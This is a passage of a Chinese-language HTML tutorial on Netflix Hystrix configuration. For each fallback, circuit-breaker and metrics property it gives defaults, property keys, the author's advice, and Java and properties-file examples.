&lt;table&gt;&lt;thead/&gt;&lt;tbody readability=&quot;2&quot;&gt;&lt;tr class=&quot;odd&quot;&gt;&lt;td&gt;默认值&lt;/td&gt;
&lt;td&gt;&lt;code&gt;true&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot;&gt;&lt;td&gt;可选值&lt;/td&gt;
&lt;td&gt;&lt;code&gt;false&lt;/code&gt;、&lt;code&gt;true&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;odd&quot; readability=&quot;2&quot;&gt;&lt;td&gt;默认全局配置&lt;/td&gt;
&lt;td&gt;&lt;code&gt;hystrix.command.default.fallback.enabled&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot; readability=&quot;2&quot;&gt;&lt;td&gt;实例配置&lt;/td&gt;
&lt;td&gt;&lt;code&gt;hystrix.command.[HystrixCommandKey].fallback.enabled&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;odd&quot;&gt;&lt;td&gt;建议(笔者备注)&lt;/td&gt;
&lt;td&gt;建议保持默认值&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p&gt;编程式配置：&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;public class CustomCommand extends HystrixCommand&amp;lt;String&amp;gt; {

    public CustomCommand() {
        super(Setter.withGroupKey(HystrixCommandGroupKey.Factory.asKey(&quot;CustomCommand&quot;))
                .andCommandPropertiesDefaults(HystrixCommandProperties.Setter()
                        .withFallbackEnabled(true)));
    }

    @Override
    protected String run() throws Exception {
        return null;
    }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;配置文件中(Properties)配置：&lt;/p&gt;
&lt;pre class=&quot;properties&quot;&gt;
&lt;code&gt;# 下面配置二选一

# 默认全局配置
hystrix.command.default.fallback.enabled=true

# 实例配置
hystrix.command.CustomCommand.fallback.enabled=true&lt;/code&gt;
&lt;/pre&gt;
&lt;h2 id=&quot;断路器circuit-breaker配置&quot;&gt;断路器(circuit breaker)配置&lt;/h2&gt;
&lt;p&gt;断路器配置用于控制&lt;code&gt;HystrixCircuitBreaker&lt;/code&gt;实例的行为。&lt;/p&gt;
&lt;h3 id=&quot;是否启用断路器&quot;&gt;是否启用断路器&lt;/h3&gt;
&lt;ul&gt;&lt;li&gt;&lt;strong&gt;circuitBreaker.enabled&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;此属性确定断路器是否用于跟踪健康状况，以及当断路器打开的时候是否用于短路请求(使请求快速失败进入降级逻辑)。&lt;/p&gt;
&lt;table&gt;&lt;thead/&gt;&lt;tbody readability=&quot;2&quot;&gt;&lt;tr class=&quot;odd&quot;&gt;&lt;td&gt;默认值&lt;/td&gt;
&lt;td&gt;&lt;code&gt;true&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot;&gt;&lt;td&gt;可选值&lt;/td&gt;
&lt;td&gt;&lt;code&gt;false&lt;/code&gt;、&lt;code&gt;true&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;odd&quot; readability=&quot;2&quot;&gt;&lt;td&gt;默认全局配置&lt;/td&gt;
&lt;td&gt;&lt;code&gt;hystrix.command.default.circuitBreaker.enabled&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot; readability=&quot;2&quot;&gt;&lt;td&gt;实例配置&lt;/td&gt;
&lt;td&gt;&lt;code&gt;hystrix.command.[HystrixCommandKey].circuitBreaker.enabled&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;odd&quot;&gt;&lt;td&gt;建议(笔者备注)&lt;/td&gt;
&lt;td&gt;建议保持默认值&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p&gt;编程式配置：&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;public class CustomCommand extends HystrixCommand&amp;lt;String&amp;gt; {

    public CustomCommand() {
        super(Setter.withGroupKey(HystrixCommandGroupKey.Factory.asKey(&quot;CustomCommand&quot;))
                .andCommandPropertiesDefaults(HystrixCommandProperties.Setter()
                        .withCircuitBreakerEnabled(true)));
    }

    @Override
    protected String run() throws Exception {
        return null;
    }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;配置文件中(Properties)配置：&lt;/p&gt;
&lt;pre class=&quot;properties&quot;&gt;
&lt;code&gt;# 下面配置二选一

# 默认全局配置
hystrix.command.default.circuitBreaker.enabled=true

# 实例配置
hystrix.command.CustomCommand.circuitBreaker.enabled=true&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;断路器请求量阈值&quot;&gt;断路器请求量阈值&lt;/h3&gt;
&lt;ul&gt;&lt;li&gt;&lt;strong&gt;circuitBreaker.requestVolumeThreshold&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;此属性设置将使断路器打开的滑动窗口中的最小请求数量。&lt;/p&gt;
&lt;p&gt;例如，如果值是20，那么如果在滑动窗口中只接收到19个请求(比如一个10秒的窗口)，即使所有19个请求都失败了，断路器也不会打开。&lt;/p&gt;
&lt;table&gt;&lt;thead/&gt;&lt;tbody readability=&quot;3&quot;&gt;&lt;tr class=&quot;odd&quot;&gt;&lt;td&gt;默认值&lt;/td&gt;
&lt;td&gt;&lt;code&gt;20&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot;&gt;&lt;td&gt;可选值&lt;/td&gt;
&lt;td&gt;-&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;odd&quot; readability=&quot;2&quot;&gt;&lt;td&gt;默认全局配置&lt;/td&gt;
&lt;td&gt;&lt;code&gt;hystrix.command.default.circuitBreaker.requestVolumeThreshold&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot; readability=&quot;2&quot;&gt;&lt;td&gt;实例配置&lt;/td&gt;
&lt;td&gt;&lt;code&gt;hystrix.command.[HystrixCommandKey].circuitBreaker.requestVolumeThreshold&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;odd&quot; readability=&quot;2&quot;&gt;&lt;td&gt;建议(笔者备注)&lt;/td&gt;
&lt;td&gt;建议保持默认值，如果部分接口不能容忍默认阈值可以单独配置&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p&gt;编程式配置：&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;public class CustomCommand extends HystrixCommand&amp;lt;String&amp;gt; {

    public CustomCommand() {
        super(Setter.withGroupKey(HystrixCommandGroupKey.Factory.asKey(&quot;CustomCommand&quot;))
                .andCommandPropertiesDefaults(HystrixCommandProperties.Setter()
                        .withCircuitBreakerRequestVolumeThreshold(10)));
    }

    @Override
    protected String run() throws Exception {
        return null;
    }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;配置文件中(Properties)配置：&lt;/p&gt;
&lt;pre class=&quot;properties&quot;&gt;
&lt;code&gt;# 下面配置二选一

# 默认全局配置
hystrix.command.default.circuitBreaker.requestVolumeThreshold=10

# 实例配置
hystrix.command.CustomCommand.circuitBreaker.requestVolumeThreshold=10&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;断路器等待窗口时间&quot;&gt;断路器等待窗口时间&lt;/h3&gt;
&lt;ul&gt;&lt;li&gt;&lt;strong&gt;circuitBreaker.sleepWindowInMilliseconds&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;此属性设置断路器打开后拒绝请求的时间量，每隔一段时间(&lt;code&gt;sleepWindowInMilliseconds&lt;/code&gt;，单位是毫秒)允许再次尝试(也就是放行一个请求)确定是否应该关闭断路器。&lt;/p&gt;
&lt;table&gt;&lt;thead/&gt;&lt;tbody readability=&quot;2&quot;&gt;&lt;tr class=&quot;odd&quot;&gt;&lt;td&gt;默认值&lt;/td&gt;
&lt;td&gt;&lt;code&gt;5000&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot;&gt;&lt;td&gt;可选值&lt;/td&gt;
&lt;td&gt;-&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;odd&quot; readability=&quot;2&quot;&gt;&lt;td&gt;默认全局配置&lt;/td&gt;
&lt;td&gt;&lt;code&gt;hystrix.command.default.circuitBreaker.sleepWindowInMilliseconds&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot; readability=&quot;2&quot;&gt;&lt;td&gt;实例配置&lt;/td&gt;
&lt;td&gt;&lt;code&gt;hystrix.command.[HystrixCommandKey].circuitBreaker.sleepWindowInMilliseconds&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;odd&quot;&gt;&lt;td&gt;建议(笔者备注)&lt;/td&gt;
&lt;td&gt;建议保持默认值&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p&gt;编程式配置：&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;public class CustomCommand extends HystrixCommand&amp;lt;String&amp;gt; {

    public CustomCommand() {
        super(Setter.withGroupKey(HystrixCommandGroupKey.Factory.asKey(&quot;CustomCommand&quot;))
                .andCommandPropertiesDefaults(HystrixCommandProperties.Setter()
                        .withCircuitBreakerSleepWindowInMilliseconds(5000)));
    }

    @Override
    protected String run() throws Exception {
        return null;
    }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;配置文件中(Properties)配置：&lt;/p&gt;
&lt;pre class=&quot;properties&quot;&gt;
&lt;code&gt;# 下面配置二选一

# 默认全局配置
hystrix.command.default.circuitBreaker.sleepWindowInMilliseconds=5000

# 实例配置
hystrix.command.CustomCommand.circuitBreaker.sleepWindowInMilliseconds=5000&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;断路器错误百分比阈值&quot;&gt;断路器错误百分比阈值&lt;/h3&gt;
&lt;ul&gt;&lt;li&gt;&lt;strong&gt;circuitBreaker.errorThresholdPercentage&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;此属性设置一个错误百分比，当请求错误率超过设定值，断路器就会打开。&lt;/p&gt;
&lt;table&gt;&lt;thead/&gt;&lt;tbody readability=&quot;2&quot;&gt;&lt;tr class=&quot;odd&quot;&gt;&lt;td&gt;默认值&lt;/td&gt;
&lt;td&gt;&lt;code&gt;50&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot;&gt;&lt;td&gt;可选值&lt;/td&gt;
&lt;td&gt;-&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;odd&quot; readability=&quot;2&quot;&gt;&lt;td&gt;默认全局配置&lt;/td&gt;
&lt;td&gt;&lt;code&gt;hystrix.command.default.circuitBreaker.errorThresholdPercentage&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot; readability=&quot;2&quot;&gt;&lt;td&gt;实例配置&lt;/td&gt;
&lt;td&gt;&lt;code&gt;hystrix.command.[HystrixCommandKey].circuitBreaker.errorThresholdPercentage&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;odd&quot;&gt;&lt;td&gt;建议(笔者备注)&lt;/td&gt;
&lt;td&gt;建议保持默认值&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p&gt;编程式配置：&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;public class CustomCommand extends HystrixCommand&amp;lt;String&amp;gt; {

    public CustomCommand() {
        super(Setter.withGroupKey(HystrixCommandGroupKey.Factory.asKey(&quot;CustomCommand&quot;))
                .andCommandPropertiesDefaults(HystrixCommandProperties.Setter()
                        .withCircuitBreakerErrorThresholdPercentage(50)));
    }

    @Override
    protected String run() throws Exception {
        return null;
    }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;配置文件中(Properties)配置：&lt;/p&gt;
&lt;pre class=&quot;properties&quot;&gt;
&lt;code&gt;# 下面配置二选一

# 默认全局配置
hystrix.command.default.circuitBreaker.errorThresholdPercentage=50

# 实例配置
hystrix.command.CustomCommand.circuitBreaker.errorThresholdPercentage=50&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;注意：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;配置项&lt;code&gt;circuitBreaker.requestVolumeThreshold&lt;/code&gt;针对错误请求数量。&lt;/li&gt;
&lt;li&gt;配置项&lt;code&gt;circuitBreaker.errorThresholdPercentage&lt;/code&gt;针对错误请求百分比。&lt;/li&gt;
&lt;/ul&gt;&lt;h3 id=&quot;是否强制打开断路器&quot;&gt;是否强制打开断路器&lt;/h3&gt;
&lt;ul&gt;&lt;li&gt;&lt;strong&gt;circuitBreaker.forceOpen&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;此属性控制断路器是否强制打开，强制打开断路器会使所有请求直接进入降级逻辑，也就是包裹在&lt;code&gt;HystrixCommand#run()&lt;/code&gt;的逻辑不会执行。&lt;code&gt;circuitBreaker.forceOpen&lt;/code&gt;属性和&lt;code&gt;circuitBreaker.forceClosed&lt;/code&gt;属性互斥。&lt;/p&gt;
&lt;table&gt;&lt;thead/&gt;&lt;tbody readability=&quot;2&quot;&gt;&lt;tr class=&quot;odd&quot;&gt;&lt;td&gt;默认值&lt;/td&gt;
&lt;td&gt;&lt;code&gt;false&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot;&gt;&lt;td&gt;可选值&lt;/td&gt;
&lt;td&gt;&lt;code&gt;false&lt;/code&gt;、&lt;code&gt;true&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;odd&quot; readability=&quot;2&quot;&gt;&lt;td&gt;默认全局配置&lt;/td&gt;
&lt;td&gt;&lt;code&gt;hystrix.command.default.circuitBreaker.forceOpen&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot; readability=&quot;2&quot;&gt;&lt;td&gt;实例配置&lt;/td&gt;
&lt;td&gt;&lt;code&gt;hystrix.command.[HystrixCommandKey].circuitBreaker.forceOpen&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;odd&quot;&gt;&lt;td&gt;建议(笔者备注)&lt;/td&gt;
&lt;td&gt;建议保持默认值&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p&gt;编程式配置：&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;public class CustomCommand extends HystrixCommand&amp;lt;String&amp;gt; {

    public CustomCommand() {
        super(Setter.withGroupKey(HystrixCommandGroupKey.Factory.asKey(&quot;CustomCommand&quot;))
                .andCommandPropertiesDefaults(HystrixCommandProperties.Setter()
                        .withCircuitBreakerForceOpen(true)));
    }

    @Override
    protected String run() throws Exception {
        return null;
    }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;配置文件中(Properties)配置：&lt;/p&gt;
&lt;pre class=&quot;properties&quot;&gt;
&lt;code&gt;# 下面配置二选一

# 默认全局配置
hystrix.command.default.circuitBreaker.forceOpen=true

# 实例配置
hystrix.command.CustomCommand.circuitBreaker.forceOpen=true&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;是否强制关闭断路器&quot;&gt;是否强制关闭断路器&lt;/h3&gt;
&lt;ul&gt;&lt;li&gt;&lt;strong&gt;circuitBreaker.forceClosed&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;此属性控制断路器是否强制关闭，强制关闭断路器会导致所有和断路器相关的配置和功能都失效，&lt;code&gt;HystrixCommand#run()&lt;/code&gt;抛出异常会正常进入降级逻辑。&lt;code&gt;circuitBreaker.forceClosed&lt;/code&gt;属性和&lt;code&gt;circuitBreaker.forceOpen&lt;/code&gt;属性互斥。&lt;/p&gt;
&lt;table&gt;&lt;thead/&gt;&lt;tbody readability=&quot;2&quot;&gt;&lt;tr class=&quot;odd&quot;&gt;&lt;td&gt;默认值&lt;/td&gt;
&lt;td&gt;&lt;code&gt;false&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot;&gt;&lt;td&gt;可选值&lt;/td&gt;
&lt;td&gt;&lt;code&gt;false&lt;/code&gt;、&lt;code&gt;true&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;odd&quot; readability=&quot;2&quot;&gt;&lt;td&gt;默认全局配置&lt;/td&gt;
&lt;td&gt;&lt;code&gt;hystrix.command.default.circuitBreaker.forceClosed&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot; readability=&quot;2&quot;&gt;&lt;td&gt;实例配置&lt;/td&gt;
&lt;td&gt;&lt;code&gt;hystrix.command.[HystrixCommandKey].circuitBreaker.forceClosed&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;odd&quot;&gt;&lt;td&gt;建议(笔者备注)&lt;/td&gt;
&lt;td&gt;建议保持默认值&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p&gt;编程式配置：&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;public class CustomCommand extends HystrixCommand&amp;lt;String&amp;gt; {

    public CustomCommand() {
        super(Setter.withGroupKey(HystrixCommandGroupKey.Factory.asKey(&quot;CustomCommand&quot;))
                .andCommandPropertiesDefaults(HystrixCommandProperties.Setter()
                        .withCircuitBreakerForceClosed(true)));
    }

    @Override
    protected String run() throws Exception {
        return null;
    }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;配置文件中(Properties)配置：&lt;/p&gt;
&lt;pre class=&quot;properties&quot;&gt;
&lt;code&gt;# 下面配置二选一

# 默认全局配置
hystrix.command.default.circuitBreaker.forceClosed=true

# 实例配置
hystrix.command.CustomCommand.circuitBreaker.forceClosed=true&lt;/code&gt;
&lt;/pre&gt;
&lt;h2 id=&quot;度量统计metrics配置&quot;&gt;度量统计(metrics)配置&lt;/h2&gt;
&lt;p&gt;度量统计配置会对&lt;code&gt;HystrixCommand&lt;/code&gt;或者&lt;code&gt;HystrixObservableCommand&lt;/code&gt;执行时候的统计数据收集动作生效。&lt;/p&gt;
&lt;h3 id=&quot;滑动窗口持续时间&quot;&gt;滑动窗口持续时间&lt;/h3&gt;
&lt;ul&gt;&lt;li&gt;&lt;strong&gt;metrics.rollingStats.timeInMilliseconds&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;table&gt;&lt;thead/&gt;&lt;tbody readability=&quot;2&quot;&gt;&lt;tr class=&quot;odd&quot;&gt;&lt;td&gt;默认值&lt;/td&gt;
&lt;td&gt;&lt;code&gt;10000&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot;&gt;&lt;td&gt;可选值&lt;/td&gt;
&lt;td&gt;-&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;odd&quot; readability=&quot;2&quot;&gt;&lt;td&gt;默认全局配置&lt;/td&gt;
&lt;td&gt;&lt;code&gt;hystrix.command.default.metrics.rollingStats.timeInMilliseconds&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot; readability=&quot;2&quot;&gt;&lt;td&gt;实例配置&lt;/td&gt;
&lt;td&gt;&lt;code&gt;hystrix.command.[HystrixCommandKey].metrics.rollingStats.timeInMilliseconds&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;odd&quot;&gt;&lt;td&gt;建议(笔者备注)&lt;/td&gt;
&lt;td&gt;建议保持默认值&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p&gt;编程式配置：&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;public class CustomCommand extends HystrixCommand&amp;lt;String&amp;gt; {

    public CustomCommand() {
        super(Setter.withGroupKey(HystrixCommandGroupKey.Factory.asKey(&quot;CustomCommand&quot;))
                .andCommandPropertiesDefaults(HystrixCommandProperties.Setter()
                        .withMetricsRollingStatisticalWindowInMilliseconds(10000)));
    }

    @Override
    protected String run() throws Exception {
        return null;
    }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;配置文件中(Properties)配置：&lt;/p&gt;
&lt;pre class=&quot;properties&quot;&gt;
&lt;code&gt;# 下面配置二选一

# 默认全局配置
hystrix.command.default.metrics.rollingStats.timeInMilliseconds=10000

# 实例配置
hystrix.command.CustomCommand.metrics.rollingStats.timeInMilliseconds=10000&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;滑动窗口bucket总数&quot;&gt;滑动窗口Bucket总数&lt;/h3&gt;
&lt;ul&gt;&lt;li&gt;&lt;strong&gt;metrics.rollingStats.numBuckets&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;table&gt;&lt;thead/&gt;&lt;tbody readability=&quot;3.5&quot;&gt;&lt;tr class=&quot;odd&quot;&gt;&lt;td&gt;默认值&lt;/td&gt;
&lt;td&gt;&lt;code&gt;10&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot; readability=&quot;3&quot;&gt;&lt;td&gt;可选值&lt;/td&gt;
&lt;td&gt;需要满足&lt;code&gt;metrics.rollingStats.timeInMilliseconds % metrics.rollingStats.numBuckets == 0&lt;/code&gt;，要尽量小，否则有可能影响性能&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;odd&quot; readability=&quot;2&quot;&gt;&lt;td&gt;默认全局配置&lt;/td&gt;
&lt;td&gt;&lt;code&gt;hystrix.command.default.metrics.rollingStats.numBuckets&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot; readability=&quot;2&quot;&gt;&lt;td&gt;实例配置&lt;/td&gt;
&lt;td&gt;&lt;code&gt;hystrix.command.[HystrixCommandKey].metrics.rollingStats.numBuckets&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;odd&quot;&gt;&lt;td&gt;建议(笔者备注)&lt;/td&gt;
&lt;td&gt;建议保持默认值&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p&gt;编程式配置：&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;public class CustomCommand extends HystrixCommand&amp;lt;String&amp;gt; {

    public CustomCommand() {
        super(Setter.withGroupKey(HystrixCommandGroupKey.Factory.asKey(&quot;CustomCommand&quot;))
                .andCommandPropertiesDefaults(HystrixCommandProperties.Setter()
                        .withMetricsRollingStatisticalWindowBuckets(100)));
    }

    @Override
    protected String run() throws Exception {
        return null;
    }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;配置文件中(Properties)配置：&lt;/p&gt;
&lt;pre class=&quot;properties&quot;&gt;
&lt;code&gt;# 下面配置二选一

# 默认全局配置
hystrix.command.default.metrics.rollingStats.numBuckets=10

# 实例配置
hystrix.command.CustomCommand.metrics.rollingStats.numBuckets=10&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;是否启用百分数计算&quot;&gt;是否启用百分数计算&lt;/h3&gt;
&lt;ul&gt;&lt;li&gt;&lt;strong&gt;metrics.rollingPercentile.enabled&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;table&gt;&lt;thead/&gt;&lt;tbody readability=&quot;2&quot;&gt;&lt;tr class=&quot;odd&quot;&gt;&lt;td&gt;默认值&lt;/td&gt;
&lt;td&gt;&lt;code&gt;true&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot;&gt;&lt;td&gt;可选值&lt;/td&gt;
&lt;td&gt;&lt;code&gt;true&lt;/code&gt;、&lt;code&gt;false&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;odd&quot; readability=&quot;2&quot;&gt;&lt;td&gt;默认全局配置&lt;/td&gt;
&lt;td&gt;&lt;code&gt;hystrix.command.default.metrics.rollingPercentile.enabled&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot; readability=&quot;2&quot;&gt;&lt;td&gt;实例配置&lt;/td&gt;
&lt;td&gt;&lt;code&gt;hystrix.command.[HystrixCommandKey].metrics.rollingPercentile.enabled&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;odd&quot;&gt;&lt;td&gt;建议(笔者备注)&lt;/td&gt;
&lt;td&gt;建议保持默认值&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p&gt;编程式配置：&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;public class CustomCommand extends HystrixCommand&amp;lt;String&amp;gt; {

    public CustomCommand() {
        super(Setter.withGroupKey(HystrixCommandGroupKey.Factory.asKey(&quot;CustomCommand&quot;))
                .andCommandPropertiesDefaults(HystrixCommandProperties.Setter()
                        .withMetricsRollingPercentileEnabled(true)));
    }

    @Override
    protected String run() throws Exception {
        return null;
    }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;配置文件中(Properties)配置：&lt;/p&gt;
&lt;pre class=&quot;properties&quot;&gt;
&lt;code&gt;# 下面配置二选一

# 默认全局配置
hystrix.command.default.metrics.rollingPercentile.enabled=true

# 实例配置
hystrix.command.CustomCommand.metrics.rollingPercentile.enabled=true&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;百分数计算使用的滑动窗口持续时间&quot;&gt;百分数计算使用的滑动窗口持续时间&lt;/h3&gt;
&lt;ul&gt;&lt;li&gt;&lt;strong&gt;metrics.rollingPercentile.timeInMilliseconds&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;table&gt;&lt;thead/&gt;&lt;tbody readability=&quot;2&quot;&gt;&lt;tr class=&quot;odd&quot;&gt;&lt;td&gt;默认值&lt;/td&gt;
&lt;td&gt;&lt;code&gt;60000&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot;&gt;&lt;td&gt;可选值&lt;/td&gt;
&lt;td&gt;-&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;odd&quot; readability=&quot;2&quot;&gt;&lt;td&gt;默认全局配置&lt;/td&gt;
&lt;td&gt;&lt;code&gt;hystrix.command.default.metrics.rollingPercentile.timeInMilliseconds&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot; readability=&quot;2&quot;&gt;&lt;td&gt;实例配置&lt;/td&gt;
&lt;td&gt;&lt;code&gt;hystrix.command.[HystrixCommandKey].metrics.rollingPercentile.timeInMilliseconds&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;odd&quot;&gt;&lt;td&gt;建议(笔者备注)&lt;/td&gt;
&lt;td&gt;建议保持默认值&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p&gt;编程式配置：&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;public class CustomCommand extends HystrixCommand&amp;lt;String&amp;gt; {

    public CustomCommand() {
        super(Setter.withGroupKey(HystrixCommandGroupKey.Factory.asKey(&quot;CustomCommand&quot;))
                .andCommandPropertiesDefaults(HystrixCommandProperties.Setter()
                        .withMetricsRollingPercentileWindowInMilliseconds(60000)));
    }

    @Override
    protected String run() throws Exception {
        return null;
    }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;配置文件中(Properties)配置：&lt;/p&gt;
&lt;pre class=&quot;properties&quot;&gt;
&lt;code&gt;# 下面配置二选一

# 默认全局配置
hystrix.command.default.metrics.rollingPercentile.timeInMilliseconds=60000

# 实例配置
hystrix.command.CustomCommand.metrics.rollingPercentile.timeInMilliseconds=60000&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;百分数计算使用的bucket总数&quot;&gt;百分数计算使用的Bucket总数&lt;/h3&gt;
&lt;ul&gt;&lt;li&gt;&lt;strong&gt;metrics.rollingPercentile.numBuckets&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;table&gt;&lt;thead/&gt;&lt;tbody readability=&quot;3.5&quot;&gt;&lt;tr class=&quot;odd&quot;&gt;&lt;td&gt;默认值&lt;/td&gt;
&lt;td&gt;&lt;code&gt;6&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot; readability=&quot;3&quot;&gt;&lt;td&gt;可选值&lt;/td&gt;
&lt;td&gt;满足&lt;code&gt;metrics.rollingPercentile.timeInMilliseconds % metrics.rollingPercentile.numBuckets == 0&lt;/code&gt;，要尽量小，否则有可能影响性能&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;odd&quot; readability=&quot;2&quot;&gt;&lt;td&gt;默认全局配置&lt;/td&gt;
&lt;td&gt;&lt;code&gt;hystrix.command.default.metrics.rollingPercentile.numBuckets&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot; readability=&quot;2&quot;&gt;&lt;td&gt;实例配置&lt;/td&gt;
&lt;td&gt;&lt;code&gt;hystrix.command.[HystrixCommandKey].metrics.rollingPercentile.numBuckets&lt;/code&gt;&lt;/td&gt;
